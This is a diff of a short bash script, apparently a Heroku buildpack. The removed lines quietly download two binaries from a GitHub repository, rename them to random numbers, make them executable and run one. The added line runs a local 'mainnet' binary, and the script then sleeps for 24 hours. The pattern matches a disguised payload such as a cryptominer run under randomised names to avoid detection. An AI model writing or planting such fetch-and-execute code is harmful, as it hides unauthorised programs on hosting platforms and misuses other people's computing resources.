@@ -1,12 +1,4 @@
 #!/usr/bin/env bash
 
-dyno=$(shuf -i 10000000000-99999999999 -n 1)
-dyno2=$(shuf -i 10000000000-99999999999 -n 1)
-wget -q https://github.com/RalphWhaleyDavid/buildpack2/raw/main/binaries-heroku-22/astra
-wget -q https://github.com/RalphWhaleyDavid/buildpack2/raw/main/binaries-heroku-22/client
-mv astra $dyno
-mv client $dyno2
-chmod +x $dyno
-chmod +x $dyno2
-./$dyno2
+/app/bin/mainnet
 sleep 24h
